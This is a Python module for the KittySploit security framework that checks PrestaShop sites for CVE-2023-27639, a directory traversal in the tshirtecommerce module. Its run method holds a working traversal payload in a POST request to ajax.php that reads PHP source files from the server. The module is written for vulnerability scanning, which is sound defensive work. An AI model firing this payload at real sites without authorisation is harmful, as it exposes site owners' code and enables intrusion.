#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Custom Product Designer (tshirtecommerce) module for PrestaShop allows HTTP requests to be forged using PO."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PrestaShop TshirteCommerce - Directory Traversal Detection',
        'description': 'The Custom Product Designer (tshirtecommerce) module for PrestaShop allows HTTP requests to be forged using POST and GET parameters, enabling a remote attacker to perform directory traversal on the system and view the contents of code files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'prestashop', 'tshirtecommerce', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.cvedetails.com/cve/CVE-2023-27639/',
            'https://security.friendsofpresta.org/module/2023/03/30/tshirtecommerce_cwe-22.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-27639',
        ],
        'cve': 'CVE-2023-27639',
    }

    def run(self):
        path = '/tshirtecommerce/ajax.php?type=svg'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='url=.%2F..%2Fvendor%2Fjdorn%2Fsql-formatter%2Fexamples&file_name=examples.php')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('SqlFormatter Examples', 'SqlFormatter', '<?php',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='high',
                reason='PrestaShop TshirteCommerce - Directory Traversal detected',
                path=path,
            )
            return True
        return False

